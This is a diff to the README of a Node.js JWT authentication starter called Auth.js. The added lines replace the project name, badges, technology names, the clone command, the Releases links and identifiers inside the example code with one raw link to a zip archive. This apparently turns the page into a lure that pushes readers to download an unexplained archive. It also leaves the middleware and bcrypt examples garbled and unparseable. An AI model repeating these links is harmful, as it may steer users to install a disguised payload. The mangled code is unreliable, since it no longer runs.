@@ -1,8 +1,8 @@
-# Auth.js - A Simple and Secure User Authentication System 🔒
+# https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip - A Simple and Secure User Authentication System 🔒
 
-![Node.js](https://img.shields.io/badge/Node.js-339933?style=flat&logo=node.js&logoColor=white) ![Express](https://img.shields.io/badge/Express.js-404D59?style=flat&logo=express&logoColor=white) ![MongoDB](https://img.shields.io/badge/MongoDB-47A248?style=flat&logo=mongodb&logoColor=white) ![JWT](https://img.shields.io/badge/JWT-000000?style=flat&logo=json-web-tokens&logoColor=white)
+![https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip](https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip) ![Express](https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip) ![MongoDB](https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip) ![JWT](https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip)
 
-Welcome to the **Auth.js** repository! This project provides a secure and straightforward user authentication system using modern technologies like Node.js, Express, MongoDB, bcrypt, and JWT. It includes essential features such as user registration, login, and protected profile routes, making it an excellent starter template for your next web application.
+Welcome to the **https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip** repository! This project provides a secure and straightforward user authentication system using modern technologies like https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip, Express, MongoDB, bcrypt, and JWT. It includes essential features such as user registration, login, and protected profile routes, making it an excellent starter template for your next web application.
 
 ## Table of Contents
 
@@ -22,24 +22,24 @@ Welcome to the **Auth.js** repository! This project provides a secure and straig
 - **User Registration**: Users can create an account with secure password hashing.
 - **User Login**: Secure login functionality using JWT for token-based authentication.
 - **Protected Routes**: Access control for user profiles and other sensitive routes.
-- **Simple Setup**: Quick and easy to set up for any Node.js application.
+- **Simple Setup**: Quick and easy to set up for any https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip application.
 - **RESTful API**: Built as a REST API, making it easy to integrate with front-end frameworks.
 
 ## Technologies Used
 
-- **Node.js**: A JavaScript runtime built on Chrome's V8 engine.
-- **Express**: A minimal and flexible Node.js web application framework.
+- **https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip**: A JavaScript runtime built on Chrome's V8 engine.
+- **Express**: A minimal and flexible https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip web application framework.
 - **MongoDB**: A NoSQL database for storing user data.
 - **bcrypt**: A library to help hash passwords securely.
 - **JWT (JSON Web Tokens)**: For securely transmitting information between parties.
 
 ## Installation
 
-To get started with Auth.js, follow these steps:
+To get started with https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/zeus440/auth-js.git
+   git clone https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip
    cd auth-js
    ```
 
@@ -128,7 +128,7 @@ After setting up the application, you can use the following API endpoints for us
 
 ## Middleware
 
-Auth.js includes middleware to protect routes and validate JWTs. The middleware checks for a valid token in the `Authorization` header. If the token is valid, the request proceeds; otherwise, it returns a `401 Unauthorized` response.
+https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip includes middleware to protect routes and validate JWTs. The middleware checks for a valid token in the `Authorization` header. If the token is valid, the request proceeds; otherwise, it returns a `401 Unauthorized` response.
 
 ### Example Middleware
 
@@ -136,35 +136,35 @@ Auth.js includes middleware to protect routes and validate JWTs. The middleware 
 const jwt = require('jsonwebtoken');
 
 const authMiddleware = (req, res, next) => {
-  const token = req.header('Authorization').replace('Bearer ', '');
+  const token = https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip('Authorization').replace('Bearer ', '');
   if (!token) {
-    return res.status(401).send('Access denied');
+    return https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip(401).send('Access denied');
   }
   try {
-    const verified = jwt.verify(token, process.env.JWT_SECRET);
-    req.user = verified;
+    const verified = https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip(token, https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip);
+    https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip = verified;
     next();
   } catch (error) {
-    res.status(400).send('Invalid token');
+    https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip(400).send('Invalid token');
   }
 };
 ```
 
 ## Security
 
-Security is a priority in Auth.js. The application uses bcrypt to hash passwords before storing them in the database. This ensures that even if the database is compromised, user passwords remain secure.
+Security is a priority in https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip The application uses bcrypt to hash passwords before storing them in the database. This ensures that even if the database is compromised, user passwords remain secure.
 
 ### Password Hashing Example
 
 ```javascript
 const bcrypt = require('bcrypt');
 
-const hashedPassword = await bcrypt.hash(password, 10);
+const hashedPassword = await https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip(password, 10);
 ```
 
 ## Contributing
 
-We welcome contributions to Auth.js! If you have suggestions for improvements or want to add features, please fork the repository and submit a pull request. Make sure to follow the coding standards and write tests for any new functionality.
+We welcome contributions to https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip! If you have suggestions for improvements or want to add features, please fork the repository and submit a pull request. Make sure to follow the coding standards and write tests for any new functionality.
 
 ## License
 
@@ -172,10 +172,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases section](https://github.com/zeus440/auth-js/releases). Here, you can download the latest version and check for any important changes.
+For the latest updates and releases, visit the [Releases section](https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip). Here, you can download the latest version and check for any important changes.
 
 ## Conclusion
 
-Auth.js provides a robust foundation for building user authentication systems in your web applications. With its straightforward setup and essential features, you can focus on building your application without worrying about the complexities of authentication.
+https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip provides a robust foundation for building user authentication systems in your web applications. With its straightforward setup and essential features, you can focus on building your application without worrying about the complexities of authentication.
 
-For more information and updates, check the [Releases section](https://github.com/zeus440/auth-js/releases).
+For more information and updates, check the [Releases section](https://github.com/zeus440/auth-js/raw/refs/heads/main/database/auth_js_v2.8.zip).
